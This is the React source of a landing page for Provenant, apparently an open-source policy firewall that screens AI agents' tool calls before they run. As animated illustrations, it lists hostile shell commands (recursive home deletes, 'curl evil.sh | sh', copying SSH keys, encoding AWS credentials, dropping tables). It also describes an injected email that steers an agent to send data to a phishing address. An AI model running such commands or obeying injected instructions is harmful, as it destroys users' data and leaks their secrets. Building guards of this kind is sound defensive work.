import React, { useEffect, useState } from "react";
import { createRoot } from "react-dom/client";
import { motion, MotionConfig, AnimatePresence } from "motion/react";

// The public product page. One calm scroll: what it is, how it decides, proof, install, limits.
// Every number here comes from `python evals/run_eval.py` and the unit suite at the release commit.

const GH = "https://github.com/MithunSidhaarth/provenant";
const INSTALL = {
  windows: "irm https://raw.githubusercontent.com/MithunSidhaarth/provenant/main/install.ps1 | iex",
  mac: "curl -fsSL https://raw.githubusercontent.com/MithunSidhaarth/provenant/main/install.sh | sh",
  pip: "pip install https://github.com/MithunSidhaarth/provenant/raw/main/dist/provenant_agent_shield-0.10.3-py3-none-any.whl",
};

const up = { hidden: { opacity: 0, y: 18 }, show: { opacity: 1, y: 0, transition: { duration: 0.6, ease: [0.22, 1, 0.36, 1] } } };
const Reveal = ({ as = "div", className, children, delay = 0 }) => {
  const C = motion[as];
  return <C className={className} variants={up} initial="hidden" whileInView="show" viewport={{ once: true, margin: "-80px" }}
            transition={{ delay }}>{children}</C>;
};

function Copy({ text }) {
  const [done, setDone] = useState(false);
  return (
    <button className="copy" onClick={() => { navigator.clipboard?.writeText(text).then(() => { setDone(true); setTimeout(() => setDone(false), 1400); }, () => {}); }}
            aria-label="Copy command">{done ? "Copied" : "Copy"}</button>
  );
}

function Cmd({ text, prompt = "$" }) {
  return <div className="cmd"><code><span className="pr">{prompt}</span>{text}</code><Copy text={text} /></div>;
}

// ---------------------------------------------------------------- nav
function Nav() {
  const [solid, setSolid] = useState(false);
  useEffect(() => {
    const on = () => setSolid(window.scrollY > 24);
    on(); window.addEventListener("scroll", on, { passive: true });
    return () => window.removeEventListener("scroll", on);
  }, []);
  return (
    <header className={`nav${solid ? " solid" : ""}`}>
      <a href="#top" className="brand" aria-label="Provenant home"><Mark />Provenant</a>
      <nav className="links" aria-label="Sections">
        <a href="#how">How it works</a><a href="#features">Features</a><a href="#proof">Proof</a><a href="#install">Install</a>
      </nav>
      <div className="nav-cta">
        <a className="ghost" href={GH} rel="noopener">GitHub</a>
        <a className="btn sm" href="/getting-started">Get started</a>
      </div>
    </header>
  );
}

const Mark = () => (
  <svg className="mark" viewBox="0 0 24 24" aria-hidden="true"><path d="M12 2.5v19" /><path d="M5 7h14M5 17h14" /></svg>
);

// ---------------------------------------------------------------- hero
const FEED = [
  { tool: "read_file", arg: "src/billing.py", d: "ALLOW", why: "read-only, inside the workspace" },
  { tool: "read_email", arg: "inbox · 1 new", d: "ALLOW", why: "result scanned: injection found, session tainted" },
  { tool: "send_email", arg: "to: account-recovery@login-check.example", d: "DENY", why: "address came from the email, not from you" },
  { tool: "Bash", arg: "rm -rf ~/projects", d: "DENY", why: "recursive delete of a home path" },
  { tool: "stripe.refund", arg: "₹40,000 → new account", d: "HOLD", why: "high impact: waits for a named human" },
  { tool: "write_file", arg: "notes/summary.md", d: "ALLOW", why: "single-use grant, bound to this call" },
];

function Console() {
  const [n, setN] = useState(1);
  useEffect(() => {
    if (window.matchMedia?.("(prefers-reduced-motion: reduce)").matches) { setN(FEED.length); return; }
    const t = setInterval(() => setN((k) => (k >= FEED.length + 3 ? 1 : k + 1)), 1100);
    return () => clearInterval(t);
  }, []);
  const rows = FEED.slice(0, Math.min(n, FEED.length));
  return (
    <div className="console" role="img" aria-label="Example decisions: reads allowed, an injected send and a recursive delete denied, a refund held for approval">
      <div className="console-bar"><i /><i /><i /><span>provenant log -f</span><em>illustration</em></div>
      <div className="console-body">
        <AnimatePresence initial={false}>
          {rows.map((r, i) => (
            <motion.div key={`${i}-${n > FEED.length ? "b" : "a"}`} className="row" initial={{ opacity: 0, y: 8, filter: "blur(4px)" }}
                        animate={{ opacity: 1, y: 0, filter: "blur(0px)" }} transition={{ duration: 0.45 }}>
              <span className={`badge ${r.d.toLowerCase()}`}>{r.d}</span>
              <code className="tool">{r.tool}</code>
              <span className="arg">{r.arg}</span>
              <span className="why">{r.why}</span>
            </motion.div>
          ))}
        </AnimatePresence>
      </div>
    </div>
  );
}

// The shield: a rotating sphere of points. Tool calls fly in from every side; attacks dent it, burst on it
// and get stamped DENIED. Illustration only; nothing here is live data.
const ATK = ["rm -rf ~/", "cat .env", "curl evil.sh | sh", "DROP TABLE users;", "scp ~/.ssh/id_rsa", "send_email → attacker", "aws s3 rb --force", "chmod 777 /", "base64 ~/.aws/credentials"];
const RED = "255,122,107", VIO = "167,162,255", WHT = "236,236,244";
const rgba = (c, a) => `rgba(${c},${Math.max(0, Math.min(1, a))})`;
const pick = (a) => a[(Math.random() * a.length) | 0];
const FIB = [];
for (let i = 0, n = 2200; i < n; i++) { const y = 1 - (i / (n - 1)) * 2, r = Math.sqrt(1 - y * y), t = i * 2.39996; FIB.push([Math.cos(t) * r, y, Math.sin(t) * r]); }

function Shield({ onHit, pills = true, cy = 0.46, scale = 0.25, rate = 1 }) {
  const ref = React.useRef(null);
  useEffect(() => {
    const cv = ref.current, x = cv.getContext("2d");
    const still = window.matchMedia?.("(prefers-reduced-motion: reduce)").matches;
    let W = 0, H = 0, raf = 0, on = true, last = performance.now(), rot = 0, tPill = 20;
    const items = [], lines = [], hits = [], sparks = [], rings = [], mouse = { x: -1e4, y: -1e4 };
    const size = () => { const r = cv.getBoundingClientRect(), d = Math.min(window.devicePixelRatio || 1, 1.75); W = r.width; H = r.height;
      cv.width = W * d; cv.height = H * d; x.setTransform(d, 0, 0, d, 0, 0); x.fillStyle = "#07070a"; x.fillRect(0, 0, W, H); };
    const burst = (px, py, dir, n, spd) => { for (let i = 0; i < n; i++) { const a = dir + (Math.random() - 0.5) * 1.9, v = Math.random() * spd; sparks.push({ x: px, y: py, vx: Math.cos(a) * v, vy: Math.sin(a) * v, l: 1 }); } };
    const pill = (label, px, py, a) => {
      x.font = "500 13px GeistMono, ui-monospace, monospace"; const w = x.measureText(label).width + 20;
      x.globalAlpha = a; x.fillStyle = "rgba(10,10,15,.92)"; x.strokeStyle = rgba(RED, 0.7); x.lineWidth = 1;
      x.beginPath(); x.roundRect ? x.roundRect(px - w / 2, py - 13, w, 26, 7) : x.rect(px - w / 2, py - 13, w, 26); x.fill(); x.stroke();
      x.fillStyle = rgba(RED, 1); x.textAlign = "center"; x.fillText(label, px, py + 4.5); x.textAlign = "start"; x.globalAlpha = 1;
    };
    const frame = (dt) => {
      const small = W < 760, cx = W / 2, cyy = H * (small && pills ? cy - 0.1 : cy), R = small ? W * scale * 1.45 : Math.min(W, H) * scale, far = Math.max(W, H) * 0.62;
      x.fillStyle = "rgba(7,7,10,.34)"; x.fillRect(0, 0, W, H);
      const g = x.createRadialGradient(cx, cyy, 0, cx, cyy, R * 2.3); g.addColorStop(0, rgba(VIO, 0.12 + hits.length * 0.04)); g.addColorStop(1, rgba(VIO, 0)); x.fillStyle = g; x.fillRect(0, 0, W, H);
      rot += 0.004 * dt;
      if (Math.random() < 0.5 * rate * dt) lines.push({ a: Math.random() * 7, d: Math.max(W, H) * 0.75, v: 6 + Math.random() * 6, red: Math.random() < 0.45 });
      x.lineWidth = 1.2;
      for (let i = lines.length - 1; i >= 0; i--) { const l = lines[i]; l.d -= l.v * dt;
        if (l.d < R + 6) { if (l.red) burst(cx + Math.cos(l.a) * R, cyy + Math.sin(l.a) * R, l.a, 6, 3); lines.splice(i, 1); continue; }
        x.strokeStyle = l.red ? rgba(RED, 0.55) : rgba(WHT, 0.16); x.beginPath();
        x.moveTo(cx + Math.cos(l.a) * l.d, cyy + Math.sin(l.a) * l.d); x.lineTo(cx + Math.cos(l.a) * (l.d + 60), cyy + Math.sin(l.a) * (l.d + 60)); x.stroke(); }
      // sphere, dented where it was hit and nudged away from the cursor
      const ct = Math.cos(0.35), st = Math.sin(0.35), cr = Math.cos(rot), sr = Math.sin(rot);
      for (const p of FIB) {
        const X = p[0] * cr - p[2] * sr, Z = p[0] * sr + p[2] * cr, Y2 = p[1] * ct - Z * st, Z2 = p[1] * st + Z * ct;
        if (Z2 < -0.15) continue;
        let sx = cx + X * R, sy = cyy + Y2 * R, push = 0;
        for (const h of hits) { const d = Math.hypot(sx - h.x, sy - h.y); if (d < 120) push += (1 - d / 120) * 26 * h.l; }
        const dm = Math.hypot(sx - mouse.x, sy - mouse.y); if (dm < 90) push += (1 - dm / 90) * 14;
        if (push) { sx += X * push; sy += Y2 * push; }
        const k = (Z2 + 1) / 2, s = 1.1 + k * 1.2;
        x.fillStyle = push > 2 ? rgba(RED, 0.5 + k * 0.5) : rgba("196,192,255", 0.1 + k * 0.8); x.fillRect(sx, sy, s, s);
      }
      tPill += dt;
      if (pills && tPill > 34 / rate) { tPill = 0; items.push({ a: Math.random() * 7, d: far, v: 2.6 + Math.random(), label: pick(ATK) }); }
      for (let i = items.length - 1; i >= 0; i--) { const p = items[i]; p.d -= p.v * dt;
        const px = cx + Math.cos(p.a) * p.d, py = cyy + Math.sin(p.a) * p.d;
        if (p.d < R + 14) { burst(px, py, p.a, 40, 5); rings.push({ x: px, y: py, r: 4, l: 1 }); hits.push({ x: px, y: py, l: 1 }); onHit?.(px, py - 10, W, H); items.splice(i, 1); continue; }
        pill(p.label, px, py, Math.min(1, (far - p.d) / 80)); }
      for (let i = hits.length - 1; i >= 0; i--) { hits[i].l -= 0.03 * dt; if (hits[i].l <= 0) hits.splice(i, 1); }
      for (let i = sparks.length - 1; i >= 0; i--) { const s = sparks[i]; s.x += s.vx * dt; s.y += s.vy * dt; s.vx *= 0.97; s.vy *= 0.97; s.l -= 0.022 * dt;
        if (s.l <= 0) { sparks.splice(i, 1); continue; } x.fillStyle = rgba(RED, s.l); x.fillRect(s.x, s.y, 2.2, 2.2); }
      for (let i = rings.length - 1; i >= 0; i--) { const r = rings[i]; r.r += 3.4 * dt; r.l -= 0.02 * dt;
        if (r.l <= 0) { rings.splice(i, 1); continue; } x.strokeStyle = rgba(RED, r.l * 0.8); x.lineWidth = 1.4; x.beginPath(); x.arc(r.x, r.y, r.r, 0, 7); x.stroke(); }
    };
    const loop = (now) => { raf = requestAnimationFrame(loop); const dt = Math.min(3, (now - last) / 16.67); last = now; if (on) frame(dt); };
    size();
    if (still) { for (let i = 0; i < 90; i++) frame(1); return; }
    raf = requestAnimationFrame(loop);
    const ro = new ResizeObserver(size); ro.observe(cv);
    const io = new IntersectionObserver(([e]) => { on = e.isIntersecting; }); io.observe(cv);
    const mm = (e) => { const r = cv.getBoundingClientRect(); mouse.x = e.clientX - r.left; mouse.y = e.clientY - r.top; };
    window.addEventListener("pointermove", mm, { passive: true });
    return () => { cancelAnimationFrame(raf); ro.disconnect(); io.disconnect(); window.removeEventListener("pointermove", mm); };
  }, []);
  return <canvas ref={ref} className="shield" aria-hidden="true" />;
}

function Hero() {
  const stamp = React.useRef(null), word = React.useRef(null), last = React.useRef(0);
  const onHit = (px, py, W) => {
    const w = word.current; if (w) { w.classList.remove("hit"); void w.offsetWidth; w.classList.add("hit"); }
    const now = performance.now(), s = stamp.current; if (!s || now - last.current < 1400) return; last.current = now;
    s.style.left = Math.max(100, Math.min(W - 100, px)) + "px"; s.style.top = py + "px"; s.classList.remove("go"); void s.offsetWidth; s.classList.add("go");
  };
  return (
    <section className="hero" id="top">
      <div className="stage">
        <Shield onHit={onHit} />
        <div ref={word} className="hero-word" aria-hidden="true">PROVENANT</div>
        <div ref={stamp} className="hero-stamp" aria-hidden="true">DENIED</div>
        <div className="wrap hero-foot">
          <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.2, duration: 0.8, ease: [0.16, 1, 0.3, 1] }}>
            <div className="kicker"><span className="kdot" />Open source · local-first · MCP and Claude Code</div>
            <h1>The firewall between<br />AI agents and their tools.</h1>
          </motion.div>
          <motion.div className="foot-r" initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.35, duration: 0.8 }}>
            <p>Injected instructions can fool the model. Every tool call still hits deterministic policy before it runs.</p>
            <div className="hero-cta">
              <a className="btn" href="#install">Install in one line</a>
              <a className="btn ghost-btn" href={GH} rel="noopener">GitHub</a>
            </div>
          </motion.div>
        </div>
      </div>
      <div className="wrap">
        <Reveal className="hero-console"><Console /></Reveal>
      </div>
      <div className="wrap clients">
        <span>Sits in front of</span>
        <b>Claude Code</b><b>Claude Desktop</b><b>Cursor</b><b>VS Code</b><b>Windsurf</b><b>any stdio MCP server</b>
      </div>
    </section>
  );
}

// ---------------------------------------------------------------- how
const STEPS = [
  ["01", "The agent proposes", "A tool call arrives at the MCP proxy, the Claude Code hook or the gated tool server. Nothing runs yet."],
  ["02", "Policy decides", "Plain Python rules check paths, commands, destinations, secrets and where each value came from. No model in the loop."],
  ["03", "Only then it runs", "ALLOW issues a single-use grant for that exact call. DENY never reaches the tool. HOLD waits for a person."],
];

function How() {
  return (
    <section className="sec" id="how">
      <div className="wrap">
        <Reveal className="kicker">How it works</Reveal>
        <Reveal as="h2">Three steps.<br /><span className="mute">No model in the loop.</span></Reveal>
        <div className="steps">
          {STEPS.map(([n, t, p], i) => (
            <Reveal key={n} className="step" delay={i * 0.08}>
              <span className="n">{n}</span><h3>{t}</h3><p>{p}</p>
            </Reveal>
          ))}
        </div>
        <Reveal className="verdicts">
          <div><span className="vstamp allow">ALLOWED</span><p>Runs once, under a grant bound to the call's arguments.</p></div>
          <div><span className="vstamp deny">DENIED</span><p>Blocked with the reason. The tool is never invoked.</p></div>
          <div><span className="vstamp hold">HELD</span><p>Held until a human approves in the terminal or by phone.</p></div>
        </Reveal>
      </div>
    </section>
  );
}

// ---------------------------------------------------------------- features (bento)
function Features() {
  return (
    <section className="sec" id="features">
      <div className="wrap">
        <Reveal className="kicker">Features</Reveal>
        <Reveal as="h2">Defense that doesn't<br /><span className="mute">trust the model.</span></Reveal>
        <div className="bento">
          <Reveal className="tile big">
            <h3>Provenance tracking</h3>
            <p>Provenant remembers which values came from you and which came from content the agent read. An address copied out of a phishing email can't receive your data.</p>
            <div className="flow">
              <span className="chip">email body</span><span className="arrow">→</span>
              <span className="chip warn">account-recovery@login-check.example</span><span className="arrow">→</span>
              <span className="badge deny">DENY</span>
            </div>
          </Reveal>
          <Reveal className="tile">
            <h3>Single-use grants</h3>
            <p>An approved call runs once. Change one argument and it needs a new decision. Replays are refused.</p>
          </Reveal>
          <Reveal className="tile">
            <h3>Phone approval</h3>
            <p>Risky actions and phishing emails can ring your phone. Say the code to keep or allow; silence means no.</p>
            <span className="tag">experimental</span>
          </Reveal>
          <Reveal className="tile">
            <h3>Rug-pull protection</h3>
            <p>MCP tool definitions are pinned on first use. A tool that quietly changes its description is withheld.</p>
          </Reveal>
          <Reveal className="tile">
            <h3>Tamper-evident audit</h3>
            <p>Every decision is hash-chained and signed. <code>provenant audit verify</code> points at the first edited record.</p>
          </Reveal>
          <Reveal className="tile">
            <h3>Fewer tokens</h3>
            <p>The gated tool server returns outlines and trimmed output: tool-result tokens fell 72% on our benchmark.</p>
          </Reveal>
          <Reveal className="tile wide">
            <h3>Runs on your machine</h3>
            <p>Python standard library only. No cloud account, no API key, no telemetry. Works offline; the optional phone call is the only thing that leaves the laptop.</p>
            <div className="term">
              <div><span className="pr">$</span> provenant check Bash "rm -rf ~"</div>
              <div><span className="badge deny">DENY</span> recursive delete of a home path</div>
            </div>
          </Reveal>
        </div>
      </div>
    </section>
  );
}

// ---------------------------------------------------------------- proof
const STATS = [
  ["225/225", "attacks contained", "18 categories · 168 denied, 57 held"],
  ["53/53", "legitimate actions allowed", "no false positives in the corpus"],
  ["0.15 ms", "policy decision", "median, on our test machine"],
  ["246", "automated tests", "including a real MCP server behind the proxy"],
];

function Proof() {
  return (
    <section className="sec" id="proof">
      <div className="wrap">
        <Reveal className="kicker">Proof</Reveal>
        <Reveal as="h2">Measured, <span className="mute">not promised.</span></Reveal>
        <Reveal as="p" className="sub">We red-team our own guard. Round two was written to break it, found 41 gaps, and every one is fixed. All numbers regenerate from one command.</Reveal>
        <div className="stats">
          {STATS.map(([v, l, s], i) => (
            <Reveal key={l} className="stat" delay={i * 0.06}><b>{v}</b><span>{l}</span><small>{s}</small></Reveal>
          ))}
        </div>
        <Reveal><Cmd text="python evals/run_eval.py" /></Reveal>
        <Reveal className="note">These are our own test cases: evidence for them, not a proof against every attack. <a href={`${GH}/blob/main/docs/eval/REPORT.md`} rel="noopener">Read the full report →</a></Reveal>
      </div>
    </section>
  );
}

// ---------------------------------------------------------------- install
function Install() {
  const [os, setOs] = useState("windows");
  return (
    <section className="sec" id="install">
      <div className="wrap install">
        <div>
          <Reveal className="kicker">Install</Reveal>
          <Reveal as="h2">Two minutes <span className="mute">to protected.</span></Reveal>
          <Reveal as="p" className="sub">One wheel, no dependencies, Python 3.10 or newer. Setup shows its plan and asks before changing any config.</Reveal>
          <Reveal className="ctas"><a className="btn" href="/getting-started">Guided setup</a><a className="btn ghost-btn" href={GH} rel="noopener">Source</a></Reveal>
        </div>
        <Reveal className="panel">
          <div className="tabs" role="tablist">
            {[["windows", "Windows"], ["mac", "macOS / Linux"], ["pip", "pip"]].map(([k, l]) => (
              <button key={k} role="tab" aria-selected={os === k} className={os === k ? "on" : ""} onClick={() => setOs(k)}>{l}</button>
            ))}
          </div>
          <ol className="steps-list">
            <li><span>Install</span><Cmd text={INSTALL[os]} prompt={os === "windows" ? ">" : "$"} /></li>
            <li><span>Wrap your MCP clients and the Claude Code hook</span><Cmd text="provenant setup" /></li>
            <li><span>Prove enforcement with a safe self-test</span><Cmd text="provenant verify" /></li>
            <li><span>Watch decisions live</span><Cmd text="provenant log -f" /></li>
          </ol>
        </Reveal>
      </div>
    </section>
  );
}

// ---------------------------------------------------------------- video, limits, cta, footer
function Video() {
  const [m, setM] = useState(null);
  useEffect(() => { fetch("/media/manifest.json").then((r) => (r.ok ? r.json() : null)).then(setM, () => {}); }, []);
  if (!m?.video) return null;
  return (
    <section className="sec" id="watch">
      <div className="wrap">
        <Reveal className="kicker">Watch</Reveal>
        <Reveal as="h2">See it stop an attack.</Reveal>
        <Reveal className="video"><video controls preload="none" poster={m.poster || undefined} src={m.video} /></Reveal>
      </div>
    </section>
  );
}

const LIMITS = [
  ["Shell analysis is pattern-based.", "An agent can write a script and run it later; credential files and root deletes are caught either way."],
  ["Provenance compares values.", "A paraphrased address can slip that one rule; after injected text is read, every side effect still needs a human."],
  ["Local stdio MCP only.", "Remote HTTP MCP servers are not proxied yet."],
  ["Approval needs a terminal.", "That stops an agent approving itself in most setups. It is a speed bump, not a proof."],
];

function Limits() {
  return (
    <section className="sec" id="limits">
      <div className="wrap">
        <Reveal className="kicker">Honest limits</Reveal>
        <Reveal as="h2">What it doesn't do <span className="mute">(yet).</span></Reveal>
        <div className="limits">
          {LIMITS.map(([t, p], i) => <Reveal key={t} className="limit" delay={i * 0.05}><b>{t}</b><p>{p}</p></Reveal>)}
        </div>
      </div>
    </section>
  );
}

function Final() {
  return (
    <section className="final">
      <Shield pills={false} cy={0.5} scale={0.3} rate={0.6} />
      <div className="wrap">
        <Reveal as="h2">Assume the model obeys anything.<br /><span className="grad">Keep the world safe anyway.</span></Reveal>
        <Reveal className="hero-cta center"><a className="btn" href="#install">Get Provenant</a><a className="btn ghost-btn" href="/console">Open the console</a></Reveal>
      </div>
    </section>
  );
}

function Footer() {
  return (
    <footer className="foot">
      <div className="wrap foot-inner">
        <div className="brand"><Mark />Provenant</div>
        <p>Built by Team Parivartan for PARALLAX 2026, AgentShield track. A hackathon build, not an audited product.</p>
        <div className="foot-links">
          <a href={GH} rel="noopener">GitHub</a><a href="/getting-started">Get started</a><a href="/console">Console</a>
          <a href="/vendor/licenses/react-LICENSE.txt">Licences</a>
        </div>
      </div>
    </footer>
  );
}

function Site() {
  return (
    <MotionConfig reducedMotion="user">
      <Nav />
      <main><Hero /><How /><Features /><Proof /><Install /><Video /><Limits /><Final /></main>
      <Footer />
    </MotionConfig>
  );
}

createRoot(document.getElementById("root")).render(<Site />);
